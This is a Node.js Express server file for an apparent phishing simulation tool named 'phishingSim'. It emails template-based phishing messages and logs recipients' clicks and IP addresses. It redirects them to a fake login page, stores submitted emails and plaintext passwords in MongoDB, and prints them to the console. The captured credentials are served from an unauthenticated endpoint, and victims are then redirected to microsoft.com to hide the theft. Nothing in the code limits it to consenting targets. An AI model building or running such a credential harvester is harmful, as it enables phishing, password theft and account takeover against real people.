const mongoose = require("mongoose");
const PhishingClick = require("./models/PhishingClick");
const CapturedCredential = require("./models/CapturedCredential");
const EmailTemplate = require("./models/EmailTemplate");

require("dotenv").config();
const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");
const axios = require("axios");
const cheerio = require("cheerio");

const app = express();
app.use(express.static("public"));
app.use(cors());
app.use(express.json());

// Connect to MongoDB
mongoose
  .connect("mongodb://localhost:27017/phishingSim", {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("✅ MongoDB connected"))
  .catch((err) => console.error("❌ MongoDB error:", err));

const PORT = process.env.PORT || 5000;
const emailTemplateRoutes = require("./routes/emailTemplates");

// Use email template routes
app.use("/api/email-templates", emailTemplateRoutes);

// Configure Email Transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// API Endpoint to Send Phishing Email
app.post("/send-phishing-email", async (req, res) => {
  const { recipientEmail, templateId } = req.body;

  if (!recipientEmail || !templateId) {
    return res.status(400).json({ error: "Recipient email and template ID are required" });
  }

  try {
    // Fetch the selected email template from MongoDB
    const template = await EmailTemplate.findById(templateId);
    if (!template) {
      return res.status(404).json({ error: "Email template not found" });
    }

    // Prepare email content using the selected template
    const emailContent = template.content.replace("{recipientEmail}", recipientEmail);

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: recipientEmail,
      subject: template.name,
      html: emailContent,
    };

    await transporter.sendMail(mailOptions);
    res.json({ message: "Phishing email sent successfully!" });
  } catch (error) {
    console.error(error);
    res.status(500).json({ error: "Failed to send email" });
  }
});

// API Endpoint to Track Clicks on Phishing Links
app.get("/track-click", async (req, res) => {
  const { email } = req.query;

  if (!email) {
    return res.status(400).json({ error: "Email is required" });
  }

  try {
    await PhishingClick.create({ email, ipAddress: req.ip });

    // Redirect user (can be a fake login page or training page)
    res.redirect("/login.html");
  } catch (error) {
    console.error(error);
    res.status(500).send("Error tracking click");
  }
});

// Get all phishing click data
app.get("/clicks", async (req, res) => {
  try {
    const clicks = await PhishingClick.find().sort({ timestamp: -1 });
    res.json(clicks);
  } catch (error) {
    console.error("Error fetching clicks:", error);
    res.status(500).json({ error: "Failed to fetch click data" });
  }
});

// Get all captured credentials
app.get("/credentials", async (req, res) => {
  try {
    const credentials = await CapturedCredential.find().sort({ timestamp: -1 });
    res.json(credentials);
  } catch (error) {
    console.error("Error fetching credentials:", error);
    res.status(500).json({ error: "Failed to fetch credentials" });
  }
});

// API Endpoint to Save Submitted Credentials
app.post("/submit-credentials", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: "Email and password required" });
  }

  try {
    await CapturedCredential.create({ email, password });
    console.log("Captured credentials saved:", { email, password });

    // Redirect after submission
    res.redirect("https://www.microsoft.com"); // or any other site you want
  } catch (err) {
    console.error("Error saving credentials:", err);
    res.status(500).json({ error: "Server error" });
  }
});

// Start Server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
